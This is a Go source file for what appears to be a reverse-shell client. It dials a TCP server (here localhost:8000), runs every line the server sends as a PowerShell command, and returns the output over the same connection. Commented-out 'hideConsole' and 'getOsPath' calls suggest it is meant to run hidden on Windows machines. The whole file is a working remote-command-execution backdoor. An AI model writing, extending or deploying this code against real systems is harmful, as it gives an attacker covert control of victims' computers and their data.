package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	_ "os"
	"os/exec"

	_ "golang.org/x/sys/windows"
)

func sender(serverResponse string, conn net.Conn) {
	cmd := exec.Command("powershell", "-Command", serverResponse)

	// Capture both stdout and stderr
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Error executing command:", err)
	}

	// Log the output from PowerShell
	fmt.Println("PowerShell Output: ", string(output))

	// Send the result back to the serve
	_, err = conn.Write(output)
	if err != nil {
		log.Panic(err)
	}
}

func main() {
	//hideConsole()
	//getOsPath()
	conn, err := net.Dial("tcp", "localhost:8000")
	if err != nil {
		fmt.Println(err)
	}

	defer conn.Close()

	fmt.Println("Connected to the server, type a message and press enter...")

	for {
		// net.KeepAliveConfig(true, 300000, 30, 300)
		// Read server response
		serverResponse, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			log.Panic(err)
		}
		fmt.Println("Server Command: ", serverResponse)

		// Trim any extra spaces or newlines from the server's command
		serverResponse = serverResponse[:len(serverResponse)-1]

		// Log the actual command we're about to run
		fmt.Println("Executing PowerShell command: ", serverResponse)

		// Run the PowerShell command
		sender(serverResponse, conn)
	}
}
